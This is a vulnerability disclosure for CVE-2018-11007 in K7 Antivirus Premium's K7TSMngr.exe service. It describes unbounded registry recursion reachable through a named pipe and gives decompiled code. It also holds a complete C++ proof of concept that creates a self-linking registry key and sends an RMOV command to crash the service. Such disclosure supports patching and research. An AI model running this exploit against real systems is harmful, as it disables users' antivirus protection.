# CVE-2018-11007

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 15.1.0.53* 
* **Component**: *K7TSMngr.exe 16.0.0.70*

# K7TSMngr.exe Pipe Handler Background
*See description in [CVE-2018-8724](../CVE-2018-8724/readme.md)*

# Details
Using the named pipe *\\\\.\\pipe\\K7TSMngrService1* and the function code 0x1003E, there are multiple flaws in the registry commands, where when the code performs registry enumeration, it calls itself (recursion) to traverse down keys. However, if you self-link a key, or have a very deep registry key, and then call one of these APIs, it will cause the code to run off the end of the stack crasing the service. The PoC creates such a key and causes the enumeration. To delete the symbolic link, I'd recommend Google's Project Zero:

https://github.com/google/symboliclink-testing-tools

The function that preforms the recursion is below and the PoC code uses the RMOV action to trigger this.

```C++
// aka sub_420300 
BOOL __stdcall RegEnumKeyInternal(HKEY hKey, LPCSTR lpSubKey)
{
    LSTATUS v3; // eax
    HKEY phkResult; // [esp+8h] [ebp-110h]
    DWORD cchName; // [esp+Ch] [ebp-10Ch]
    CHAR Name[260]; // [esp+10h] [ebp-108h]

    if ( RegOpenKeyExA(hKey, lpSubKey, 0, 0x10008u, &phkResult) )
        return 0;
        while ( 1 )
        {
            cchName = 260;
            v3 = RegEnumKeyExA(phkResult, 0, Name, &cchName, 0, 0, 0, 0);
            if ( v3 == 259 || v3 )
                break;
            
            // Issue: Unbounded recursion here, so a 
            if ( !RegEnumKeyInternal(phkResult, Name) )
                return 0;
        }
    RegCloseKey(phkResult);
    return RegDeleteKeyA(hKey, lpSubKey) == 0;
}

```

# PoC Code
```C++
#include <Windows.h>
#include <sddl.h>
#include <stdio.h>
#include <winternl.h>


/////////////////////////////////////
// Common code to talk to the Pipe //
/////////////////////////////////////
typedef struct _unk1
{
	DWORD dwMagic;
	DWORD dwSomeMagic;
	DWORD dwInSize;
	DWORD field_c;
	DWORD dwFunctionId;
	DWORD dwInputDataSize;
	DWORD dwOutputDataSize;
} unk1;

HANDLE g_hPipe = INVALID_HANDLE_VALUE;

BOOL InitPipe()
{
	g_hPipe = CreateFileA("\\\\.\\pipe\\K7TSMngrService1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileW Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL CallPipeFunction(DWORD dwFunctionId, PBYTE pInput, DWORD dwInSize, PBYTE pOutput, DWORD dwOutSize)
{
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		if (!InitPipe())
		{
			return FALSE;
		}
	}

	unk1 u1 = { 0 };
	u1.dwMagic = 0x4B375453;
	u1.dwSomeMagic = 0x1010;
	u1.dwInSize = 28;
	u1.dwFunctionId = dwFunctionId;
	u1.dwInputDataSize = dwInSize;

	DWORD dwBytesWritten = 0;
	if (!WriteFile(g_hPipe, &u1, sizeof(u1), &dwBytesWritten, NULL))
	{
		printf("WriteFile 1 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	if (!WriteFile(g_hPipe, pInput, dwInSize, &dwBytesWritten, NULL))
	{
		printf("WriteFile 2 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

PVOID AllocPrecise(DWORD dwSize)
{
	DWORD dwPageSize = ((dwSize + 4096 - 1) / 4096) * 4096;
	PBYTE pOffset = (PBYTE)VirtualAlloc(NULL, dwPageSize, MEM_COMMIT, PAGE_READWRITE);

	if (dwSize % 0x1000 == 0)
	{
		return pOffset;
	}
	pOffset += 4096 - (dwSize % 4096);
	return pOffset;
}
/////////////////////////////
// End of common pipe code //
/////////////////////////////

static PSTR GetUserSid()
{
	DWORD dwSize;
	PSTR pszStringSid;
	HANDLE hToken;

	OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
	GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);

	PTOKEN_USER pTokenUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);

	GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize);

	if (!ConvertSidToStringSidA(pTokenUser->User.Sid, &pszStringSid))
	{
		return NULL;
	}

	return pszStringSid;
}

typedef VOID(NTAPI *fRtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);

typedef NTSTATUS(__stdcall *fNtSetValueKey)(
	HANDLE  KeyHandle,
	PUNICODE_STRING  ValueName,
	ULONG  TitleIndex,
	ULONG  Type,
	PVOID  Data,
	ULONG  DataSize
	);

BOOL SetupRegistry()
{
	// Create a registry key in HKCU\aaa\bbb where bbb points back to aaa. Therefore if you recurse
	// into bbb you go back into yourself.

	WCHAR szRegOriginalKey[MAX_PATH] = { 0 };
	WCHAR szRegNative[MAX_PATH] = { 0 };
	PSTR pszUserSid = GetUserSid();
	wsprintfW(szRegOriginalKey, L"%S\\aaa", pszUserSid);
	wsprintfW(szRegNative, L"\\Registry\\User\\%S\\aaa", pszUserSid);

	HKEY hKeyAaa;
	RegCreateKeyW(HKEY_USERS, szRegOriginalKey, &hKeyAaa);

	HMODULE hNtdll = GetModuleHandle(L"ntdll");
	fNtSetValueKey pfNtSetValueKey = (fNtSetValueKey)GetProcAddress(hNtdll, "NtSetValueKey");
	fRtlInitUnicodeString pfRtlInitUnicodeString = (fRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");

	HKEY hKeyBbb;
	RegCreateKeyExW(hKeyAaa, L"bbb", 0, NULL, REG_OPTION_CREATE_LINK, KEY_ALL_ACCESS, NULL, &hKeyBbb, NULL);

	UNICODE_STRING value_name;
	pfRtlInitUnicodeString(&value_name, L"SymbolicLinkValue");
	pfNtSetValueKey(hKeyBbb, &value_name, 0, REG_LINK, szRegNative, wcslen(szRegNative) * sizeof(WCHAR));

	return TRUE;
}


//
// Vulnerability
//		Type: 
//			Denial of Service / Stack Corruption
//
//		Description: 
//			In the RMov command (and more probably) when the registry key provided is enumerated it
//			recurses when it finds a new key to go into. However, there is no limit to the recursion
//			and therefore by either providing a long path, or linking a registry key so it points
//			back to itself, we can force this routine to infinitely recurse until it runs out of 
//			stack. At this point K7TSMngr crashes.
//
void Vuln_LogicFlaw_RMov()
{
	CHAR szSourceKey[MAX_PATH] = { 0 };
	CHAR szDestKey[MAX_PATH] = { 0 };
	PSTR pszUserSid = GetUserSid();

	// Make source and dest the same for now, doesn't really matter
	wsprintfA(szSourceKey, "HKCU\\%s\\aaa", pszUserSid);
	wsprintfA(szDestKey, "%s", szSourceKey);

	PVOID pData = AllocPrecise(0x8000);
	// 524D4F56		RMOV
	DWORD dwAction = 0x524D4F56;
	memcpy(pData, &dwAction, 4);
	PSTR pszData = (PSTR)(((PBYTE)pData) + 4);

	strcat(pszData, szSourceKey);
	pszData += strlen(szSourceKey) + 1;

	strcat(pszData, szDestKey);
	pszData += strlen(szDestKey) + 1;

	PDWORD pdwData = (PDWORD)pszData;
	*pdwData = 1;

	DWORD dwSize = 4 + strlen(szSourceKey) + strlen(szDestKey) + 2 + 4;


	CallPipeFunction(0x1003E, (PBYTE)pData, dwSize, NULL, 0);
}

int wmain(int argc, wchar_t** argv)
{
	printf("Creating a REG_LINK in the registry for us to delete.\r\n");
	SetupRegistry();

	printf("Deleting the self-referencing registry link\r\nExpecting service to crash\r\n");
	Vuln_LogicFlaw_RMov();
}
```